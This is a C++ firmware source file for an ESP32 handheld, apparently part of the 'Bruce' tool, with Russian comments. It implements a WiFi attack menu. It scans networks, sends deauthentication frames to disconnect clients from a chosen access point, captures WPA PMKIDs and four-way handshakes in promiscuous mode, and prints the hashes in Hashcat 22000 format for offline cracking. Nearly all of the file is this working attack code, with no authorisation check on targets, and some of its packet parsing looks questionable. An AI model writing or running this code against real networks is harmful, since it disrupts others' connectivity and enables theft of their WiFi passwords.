#include "wifi_test.h"
#include "core/display.h"
#include "core/utils.h"
#include "core/wifi/wifi_common.h"
#include "esp_wifi.h"
#include "modules/wifi/wifi_atks.h"
#include <ESP8266SAM.h>
#include <FS.h>
#include <SD.h>
#include <SPI.h>
#include <WiFi.h>
#include <vector>

// Заголовок для пакетов данных, отправляемых на ПК
#define PACKET_HEADER "BRUCE_WIFI_DATA"
#define PACKET_VERSION 1

// Типы пакетов данных
#define DATA_TYPE_NETWORK_INFO "NET_INFO"
#define DATA_TYPE_PMKID "PMKID"
#define DATA_TYPE_HANDSHAKE "HANDSHAKE"
#define DATA_TYPE_RAW_PACKET "RAW_PKT"

// Буфер для хранения PMKID
uint8_t pmkid_buffer[32];
bool pmkid_captured = false;

// Буфер для EAPOL-пакетов (WPA handshake)
typedef struct {
    uint8_t packet_num; // Номер пакета в handshake (1-4)
    uint8_t data[256];  // Данные EAPOL пакета
    size_t length;      // Длина пакета
    bool valid;         // Флаг валидности
} eapol_packet_t;

// Структура для хранения данных handshake
typedef struct {
    uint8_t bssid[6];
    uint8_t sta_mac[6];
    uint8_t essid[32];
    uint8_t essid_len;
    uint8_t pmkid[16];
    eapol_packet_t eapol_packets[4]; // 4 пакета WPA handshake
    bool pmkid_valid;
    bool handshake_complete;
} handshake_data_t;

// Глобальная структура для хранения handshake
handshake_data_t current_handshake = {0};

// Буфер для EAPOL-пакетов
typedef struct {
    uint8_t bssid[6];
    uint8_t sta_mac[6];
    uint8_t essid[32];
    uint8_t essid_len;
    uint8_t pmkid[16];
    bool valid;
} pmkid_t;

// Обработчик для перехвата PMKID и EAPOL пакетов
void wifi_sniffer_packet_handler(void *buff, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;

    const wifi_promiscuous_pkt_t *ppkt = (wifi_promiscuous_pkt_t *)buff;
    const uint8_t *payload = ppkt->payload;
    const uint8_t *frame_control = payload;

    // Проверка на EAPOL-пакет (WPA handshake)
    if ((frame_control[0] == 0x88) && (frame_control[1] == 0x8E)) {
        // EAPOL пакет обнаружен
        uint8_t *eapol = (uint8_t *)payload + 24 + 8;

        // Отправляем весь пакет на ПК для обработки
        send_data_to_pc(DATA_TYPE_RAW_PACKET, payload, ppkt->rx_ctrl.sig_len);

        // Сохраняем данные handshake
        if (eapol[0] == 0x02) { // Key frame
            uint8_t packet_num = 0;

            // Определяем номер пакета в handshake
            if (eapol[1] == 0x03 && eapol[3] == 0x00) { // Message 1 (from AP)
                packet_num = 1;

                // Сохраняем BSSID и проверяем PMKID
                memcpy(current_handshake.bssid, &payload[10], 6);
                memcpy(current_handshake.sta_mac, &payload[4], 6);

                // Проверяем наличие PMKID
                uint8_t *key_data = eapol + 95;
                for (int i = 0; i < 32; i++) {
                    if (key_data[i] == 0xDD && key_data[i + 4] == 0x00 && key_data[i + 5] == 0x0F &&
                        key_data[i + 6] == 0xAC && key_data[i + 7] == 0x04) {
                        // Нашли PMKID
                        memcpy(pmkid_buffer, key_data + i + 8, 16);
                        memcpy(current_handshake.pmkid, key_data + i + 8, 16);
                        current_handshake.pmkid_valid = true;
                        pmkid_captured = true;

                        // Отправляем PMKID на ПК
                        send_data_to_pc(DATA_TYPE_PMKID, pmkid_buffer, 16);
                        break;
                    }
                }
            } else if ((eapol[1] == 0x01) && ((eapol[3] & 0x8A) == 0x0A)) { // Message 2 (from Client)
                packet_num = 2;
            } else if ((eapol[1] == 0x13) && ((eapol[3] & 0x89) == 0x09)) { // Message 3 (from AP)
                packet_num = 3;
            } else if ((eapol[1] == 0x01) && ((eapol[3] & 0x89) == 0x09)) { // Message 4 (from Client)
                packet_num = 4;
                current_handshake.handshake_complete = true;

                // Отправляем полный handshake на ПК
                send_data_to_pc(DATA_TYPE_HANDSHAKE, (uint8_t *)&current_handshake, sizeof(handshake_data_t));
            }

            // Сохраняем пакет handshake
            if (packet_num > 0 && packet_num <= 4) {
                size_t eapol_len = payload[2] | (payload[3] << 8); // Длина из заголовка
                if (eapol_len > sizeof(current_handshake.eapol_packets[0].data))
                    eapol_len = sizeof(current_handshake.eapol_packets[0].data);

                current_handshake.eapol_packets[packet_num - 1].packet_num = packet_num;
                memcpy(current_handshake.eapol_packets[packet_num - 1].data, eapol, eapol_len);
                current_handshake.eapol_packets[packet_num - 1].length = eapol_len;
                current_handshake.eapol_packets[packet_num - 1].valid = true;
            }
        }
    }
}

// Отправляет собранные данные на ПК через последовательный порт
bool send_data_to_pc(const char *data_type, const uint8_t *data_buffer, size_t data_length) {
    // Проверка параметров
    if (!data_type || !data_buffer || data_length == 0) return false;

    // Сериализация данных в формате, понятном для программы на ПК
    Serial.println(PACKET_HEADER);  // Заголовок пакета
    Serial.println(PACKET_VERSION); // Версия протокола
    Serial.println(data_type);      // Тип данных
    Serial.println(data_length);    // Длина данных

    // Отправляем данные как HEX строку
    for (size_t i = 0; i < data_length; i++) {
        if (data_buffer[i] < 0x10) Serial.print("0");
        Serial.print(data_buffer[i], HEX);
    }
    Serial.println();

    // Завершаем пакет
    Serial.println("END_" PACKET_HEADER);

    return true;
}

// Отправляет информацию о сети на ПК
bool send_network_info_to_pc(const String &ssid, const uint8_t *bssid, uint8_t channel, int encryption_type) {
    if (!bssid) return false;

    // Создаем буфер с информацией о сети
    uint8_t network_info[64] = {0};
    size_t offset = 0;

    // Канал
    network_info[offset++] = channel;

    // Тип шифрования
    network_info[offset++] = (uint8_t)encryption_type;

    // BSSID (MAC точки доступа)
    memcpy(&network_info[offset], bssid, 6);
    offset += 6;

    // Длина SSID
    size_t ssid_len = ssid.length();
    if (ssid_len > 32) ssid_len = 32;
    network_info[offset++] = (uint8_t)ssid_len;

    // SSID
    memcpy(&network_info[offset], ssid.c_str(), ssid_len);
    offset += ssid_len;

    // Отправляем информацию на ПК
    return send_data_to_pc(DATA_TYPE_NETWORK_INFO, network_info, offset);
}

/**
 * Выполняет деаутентификацию целевой сети
 *
 * @param ssid Имя сети
 * @param bssid MAC-адрес точки доступа
 * @param channel Канал сети
 * @return true если деаутентификация успешна, false в противном случае
 */
bool deauth_network(String ssid, const uint8_t *bssid, uint8_t channel) {
    drawMainBorderWithTitle("WiFi-test: Deauth");
    padprintln("");
    padprint("Network: " + ssid);

    // Подготавливаем AP record для деаутентификации
    wifi_ap_record_t record;
    memcpy(record.bssid, bssid, 6);
    record.primary = channel;

    // Отправляем пакеты деаутентификации
    WiFi.mode(WIFI_AP);
    if (!WiFi.softAP("WiFi-test", "", channel, 0, 4, false)) {
        displayError("Failed to start AP mode", true);
        return false;
    }

    // Сообщаем на ПК о начале деаутентификации
    Serial.println("START_DEAUTH");
    Serial.print("SSID:");
    Serial.println(ssid);
    Serial.print("BSSID:");
    for (int i = 0; i < 6; i++) {
        if (bssid[i] < 0x10) Serial.print("0");
        Serial.print(bssid[i], HEX);
        if (i < 5) Serial.print(":");
    }
    Serial.println();
    Serial.print("CHANNEL:");
    Serial.println(channel);

    // Отправляем деаутентификационные пакеты
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));

    // Простая анимация процесса
    padprintln("");
    padprint("Deauthenticating");
    for (int i = 0; i < 10; i++) {
        padprint(".");
        // Отправляем фреймы
        wsl_bypasser_send_raw_frame(&record, channel);
        send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
        delay(300);
    }

    // Сообщаем на ПК о завершении деаутентификации
    Serial.println("END_DEAUTH");

    padprintln("");
    padprintln("Deauth complete!");
    delay(1000);

    // Выключаем AP
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);

    return true;
}

/**
 * Попытка PMKID атаки на сеть WiFi
 *
 * @param ssid Имя сети
 * @param bssid MAC-адрес точки доступа
 * @param channel Канал сети
 * @return true если PMKID захвачен, false в противном случае
 */
bool capture_pmkid(String ssid, const uint8_t *bssid, uint8_t channel) {
    drawMainBorderWithTitle("WiFi-test: PMKID Capture");
    padprintln("");
    padprintln("Network: " + ssid);
    padprintln("");
    padprint("Setting up sniffer...");

    // Сбрасываем флаги и данные
    pmkid_captured = false;
    memset(&current_handshake, 0, sizeof(handshake_data_t));

    // Сохраняем информацию о сети
    memcpy(current_handshake.bssid, bssid, 6);
    memcpy(current_handshake.essid, ssid.c_str(), ssid.length());
    current_handshake.essid_len = ssid.length();

    // Сообщаем на ПК о начале перехвата PMKID
    Serial.println("START_PMKID_CAPTURE");
    Serial.print("SSID:");
    Serial.println(ssid);
    Serial.print("BSSID:");
    for (int i = 0; i < 6; i++) {
        if (bssid[i] < 0x10) Serial.print("0");
        Serial.print(bssid[i], HEX);
        if (i < 5) Serial.print(":");
    }
    Serial.println();
    Serial.print("CHANNEL:");
    Serial.println(channel);

    // Отправляем информацию о сети на ПК для анализа
    send_network_info_to_pc(ssid, bssid, channel, WIFI_AUTH_WPA2_PSK);

    // Настройка WiFi в режим прослушивания
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_STA);

    // Установка канала
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    // Настройка прослушивания
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_packet_handler);

    padprintln("OK");
    padprintln("Capturing PMKID/Handshake...");

    // Попытка подключения для получения PMKID
    WiFi.begin(ssid.c_str(), "FAKEWRONGPASSWORD");

    // Ожидание PMKID или полного handshake с анимацией
    unsigned long startTime = millis();
    int dots = 0;

    while (!pmkid_captured && !current_handshake.handshake_complete && millis() - startTime < 8000) {
        padprint(".");
        dots++;
        if (dots > 30) {
            padprintln("");
            padprint("Waiting for PMKID/Handshake");
            dots = 0;
        }
        delay(100);
    }

    // Отключаем прослушивание
    esp_wifi_set_promiscuous(false);
    WiFi.disconnect();

    // Сообщаем на ПК о завершении перехвата
    Serial.println("END_PMKID_CAPTURE");

    if (pmkid_captured) {
        padprintln("");
        padprintln("PMKID captured successfully!");

        // Выводим хеш для Hashcat
        String pmkid_hash = "*" + ssid + ":";

        // BSSID
        for (int i = 0; i < 6; i++) {
            if (bssid[i] < 0x10) pmkid_hash += "0";
            pmkid_hash += String(bssid[i], HEX);
        }
        pmkid_hash += ":";

        // PMKID
        for (int i = 0; i < 16; i++) {
            if (pmkid_buffer[i] < 0x10) pmkid_hash += "0";
            pmkid_hash += String(pmkid_buffer[i], HEX);
        }

        padprintln("");
        padprintln("Hashcat format (mode 22000):");
        padprintln(pmkid_hash);
        padprintln("");
        padprintln("PC will process the data.");

        return true;
    } else if (current_handshake.handshake_complete) {
        padprintln("");
        padprintln("Full WPA handshake captured!");
        padprintln("");
        padprintln("PC will process the data.");

        return true;
    } else {
        padprintln("");
        padprintln("Failed to capture PMKID or handshake!");
        padprintln("Router may not support PMKID");
        return false;
    }
}

/**
 * Подключается к сети с найденным паролем
 *
 * @param ssid Имя сети
 * @param password Пароль сети
 * @return true если подключение успешно, false в противном случае
 */
bool connect_to_network(String ssid, String password) {
    drawMainBorderWithTitle("WiFi-test: Connect");
    padprintln("");
    padprint("Connecting to: " + ssid);
    padprintln("");
    padprint("Password: " + password);
    padprintln("");

    // Настраиваем WiFi для подключения
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    // Включаем автоподключение
    WiFi.setAutoReconnect(true);

    // Подключаемся
    WiFi.begin(ssid.c_str(), password.c_str());

    // Ждем подключения с анимацией
    padprint("Connecting");
    int dots = 0;
    unsigned long startTime = millis();

    while (WiFi.status() != WL_CONNECTED && millis() - startTime < 10000) {
        padprint(".");
        dots++;
        if (dots > 20) {
            // Очищаем строку и начинаем заново
            padprintln("");
            padprint("Connecting");
            dots = 0;
        }
        delay(300);
    }

    padprintln("");

    if (WiFi.status() == WL_CONNECTED) {
        wifiConnected = true;
        wifiIP = WiFi.localIP().toString();
        padprintln("Connected!");
        padprintln("IP: " + wifiIP);
        updateClockTimezone();
        drawStatusBar();
        return true;
    } else {
        padprintln("Connection failed!");
        WiFi.disconnect();
        return false;
    }
}

void wifi_test_run() {
    int nets;
    WiFi.mode(WIFI_MODE_STA);
    bool refresh_scan = false;
    std::vector<wifi_ap_record_t> ap_records;

    // Сообщаем на ПК о запуске WiFi инструмента
    Serial.println("BRUCE_WIFI_TOOL_START");
    Serial.println(PACKET_VERSION);

    do {
        // Всплывающее сообщение о сканировании, как в стандартном интерфейсе
        displayTextLine("Scanning..");

        // Сканируем сети
        nets = WiFi.scanNetworks();

        // Сообщаем на ПК о результатах сканирования
        Serial.println("SCAN_RESULTS");
        Serial.println(nets);

        // Очищаем предыдущие результаты и готовим новый список
        options.clear();
        ap_records.clear();

        for (int i = 0; i < nets; i++) {
            wifi_ap_record_t record;
            memcpy(record.bssid, WiFi.BSSID(i), 6);
            record.primary = static_cast<uint8_t>(WiFi.channel(i));
            ap_records.push_back(record);

            String ssid = WiFi.SSID(i);
            int encryptionType = WiFi.encryptionType(i);
            int32_t rssi = WiFi.RSSI(i);

            // Отправляем информацию о сети на ПК
            send_network_info_to_pc(ssid, WiFi.BSSID(i), WiFi.channel(i), encryptionType);

            // Формат строки как в стандартном меню WiFi
            String encryptionPrefix = (encryptionType == WIFI_AUTH_OPEN) ? "" : "#";
            String encryptionTypeStr;
            switch (encryptionType) {
                case WIFI_AUTH_OPEN: encryptionTypeStr = "Open"; break;
                case WIFI_AUTH_WEP: encryptionTypeStr = "WEP"; break;
                case WIFI_AUTH_WPA_PSK: encryptionTypeStr = "WPA/PSK"; break;
                case WIFI_AUTH_WPA2_PSK: encryptionTypeStr = "WPA2/PSK"; break;
                case WIFI_AUTH_WPA_WPA2_PSK: encryptionTypeStr = "WPA/WPA2/PSK"; break;
                case WIFI_AUTH_WPA2_ENTERPRISE: encryptionTypeStr = "WPA2/Enterprise"; break;
                default: encryptionTypeStr = "Unknown"; break;
            }

            String optionText = encryptionPrefix + ssid + " (" + String(rssi) + "|" + encryptionTypeStr + ")";

            options.push_back({optionText.c_str(), [=]() {
                                   // Получаем информацию о выбранной сети
                                   String selected_ssid = WiFi.SSID(i);
                                   uint8_t bssid[6];
                                   memcpy(bssid, WiFi.BSSID(i), 6);
                                   uint8_t channel = WiFi.channel(i);

                                   // Предлагаем выбор метода атаки/подключения
                                   std::vector<Option> attack_options = {
                                       {"Capture PMKID",
                                        [=]() {
                                            // Попытка PMKID атаки
                                            bool pmkid_success = capture_pmkid(selected_ssid, bssid, channel);

                                            // Ждем нажатия любой кнопки после PMKID атаки независимо от
                                            // результата
                                            padprintln("");
                                            padprintln("Press any button to continue...");
                                            while (!check(SelPress) && !check(EscPress)) {
                                                vTaskDelay(50 / portTICK_RATE_MS);
                                            }
                                        }},
                                       {"Deauth + Capture",
                                        [=]() {
                                            // Деаутентификация для активации handshake
                                            bool deauth_success =
                                                deauth_network(selected_ssid, bssid, channel);

                                            if (deauth_success) {
                                                // После деаутентификации пытаемся перехватить handshake
                                                bool capture_success =
                                                    capture_pmkid(selected_ssid, bssid, channel);

                                                // Показываем результат
                                                drawMainBorderWithTitle("WiFi-test: Result");
                                                padprintln("");
                                                padprintln("Network: " + selected_ssid);

                                                if (capture_success) {
                                                    padprintln("");
                                                    padprintln("Data capture successful!");
                                                    padprintln("");
                                                    padprintln("Data sent to PC for processing.");
                                                } else {
                                                    padprintln("");
                                                    padprintln("Data capture failed.");
                                                    padprintln("Try again or try with another network.");
                                                }

                                                // Ждем нажатия любой кнопки
                                                padprintln("");
                                                padprintln("Press any button to continue...");
                                                while (!check(SelPress) && !check(EscPress)) {
                                                    vTaskDelay(50 / portTICK_RATE_MS);
                                                }
                                            }
                                        }},
                                       {"Connect (saved)",
                                        [=]() {
                                            // Проверяем, есть ли сохраненный пароль для этой сети
                                            String saved_password =
                                                bruceConfig.getWifiPassword(selected_ssid);

                                            if (saved_password != "") {
                                                // Используем сохраненный пароль
                                                connect_to_network(selected_ssid, saved_password);

                                                // Ждем нажатия кнопки
                                                padprintln("");
                                                padprintln("Press any button to continue...");
                                                while (!check(SelPress) && !check(EscPress)) {
                                                    vTaskDelay(50 / portTICK_RATE_MS);
                                                }
                                            } else {
                                                displayError("No saved password for this network", true);
                                            }
                                        }},
                                       {"Back",
                                        [=]() {
                                            // Просто выходим из меню
                                        }}
                                   };

                                   // Если сеть открытая, предлагаем только подключение
                                   if (encryptionType == WIFI_AUTH_OPEN) {
                                       attack_options = {
                                           {"Connect (Open)",
                                            [=]() {
                                                // Для открытых сетей просто подключаемся
                                                connect_to_network(selected_ssid, "");

                                                // Ждем нажатия кнопки
                                                padprintln("");
                                                padprintln("Press any button to continue...");
                                                while (!check(SelPress) && !check(EscPress)) {
                                                    vTaskDelay(50 / portTICK_RATE_MS);
                                                }
                                            }},
                                           {"Back",
                                            [=]() {
                                                // Просто выходим из меню
                                            }}
                                       };
                                   }

                                   // Показываем меню выбора атаки
                                   drawMainBorderWithTitle("WiFi-test: " + selected_ssid);
                                   padprintln("");
                                   padprintln("Network: " + selected_ssid);
                                   padprintln("Channel: " + String(channel));
                                   padprintln("Security: " + encryptionTypeStr);
                                   padprintln("");
                                   padprintln("Select operation:");

                                   loopOptions(attack_options);
                               }});
        }

        // Добавляем опцию возврата в главное меню
        addOptionToMainMenu();

        // Отображаем список сетей
        loopOptions(options);

        // Проверяем нажатие Esc для повторного сканирования
        if (check(EscPress)) {
            refresh_scan = true;
        } else {
            refresh_scan = false;
        }

    } while (refresh_scan);

    // Сообщаем на ПК о завершении WiFi инструмента
    Serial.println("BRUCE_WIFI_TOOL_END");
}
